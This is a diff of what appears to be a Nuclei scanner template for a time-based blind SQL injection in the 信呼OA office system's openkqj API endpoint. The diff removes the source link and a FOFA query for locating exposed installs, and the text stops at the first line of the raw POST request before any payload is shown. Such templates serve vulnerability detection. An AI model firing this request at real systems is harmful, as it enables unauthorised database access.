@@ -3,14 +3,8 @@ info:
   name: 信呼OA openkqjAction 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gshcple6s68rcde2
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gshcple6s68rcde2
-    fofa: app="信呼-OA系统"
 http:
 - raw:
   - 'POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1
